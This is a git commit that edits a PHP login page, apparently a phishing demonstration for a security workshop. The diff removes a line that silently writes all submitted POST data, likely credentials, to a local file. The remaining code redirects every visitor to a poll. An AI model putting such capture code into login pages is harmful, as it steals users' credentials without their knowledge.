8051744164255da54703e835dbe1ad2af36ac56e
irjdekker <ir.j.dekker@gmail.com>
2017-06-06 21:30:55 +0200

    C

--- common/login.php
+++ common/login.php
@@ -1,5 +1,4 @@
 <?php
-file_put_contents("file.txt", serialize($_POST));
 header("Location: /documents/poll.php?otm_source=poll%2C%20itility%2C%20workshop&otm_medium=security&otm_campaign=workshop&otm_term=questions%2C%20poll", true, 301);
 exit();
 ?>
